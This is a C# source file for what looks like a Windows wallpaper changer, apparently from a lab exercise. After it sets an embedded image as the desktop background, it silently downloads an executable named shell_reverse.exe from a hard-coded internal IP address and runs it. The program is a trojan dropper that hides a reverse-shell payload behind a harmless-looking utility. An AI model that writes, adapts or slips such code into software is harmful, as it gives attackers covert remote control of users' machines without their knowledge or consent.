using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;

namespace ChangeBackground2
{
    class App
    {
        const int SPI_SETDESKWALLPAPER = 0x14;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;

        static void checkConnection()
        {
            // Check internet
            Ping ping = new Ping();
            PingReply reply = ping.Send("8.8.8.8", 2000);

            // get path where will save the reverse shell
            string desFolder = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

            if (reply.Status == IPStatus.Success)
            {
                using (var client = new WebClient())
                {
                    try
                    {
                        client.DownloadFile("http://192.168.111.128/shell_reverse.exe", desFolder + "\\shell_reverse.exe");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.StackTrace);
                        return;
                    }
                }

                // run reverse shell after downloaded
                System.Diagnostics.Process.Start(desFolder + "\\shell_reverse.exe");
            }
            else
            {
                // Create file
                FileStream stream = new FileStream((desFolder + "\\iwashere.txt"), FileMode.OpenOrCreate);
                StreamWriter writer = new StreamWriter(stream);

                // Write file
                writer.Write("I Was Here!");

                writer.Close();
                stream.Close();
            }
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Running...");

            // Get image from resource
            Bitmap bitmap = ChangeBackground2.Properties.Resources.image;

            // Get path and save image from Resource
            string imagePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\image.jpg";
            bitmap.Save(imagePath, ImageFormat.Jpeg);

            // Set new background with the image which the path is imagePath
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, imagePath, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);

            checkConnection();

        }

        // Khai báo sử dụng hàm SystemParametersInfo có trong user32.dll
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}
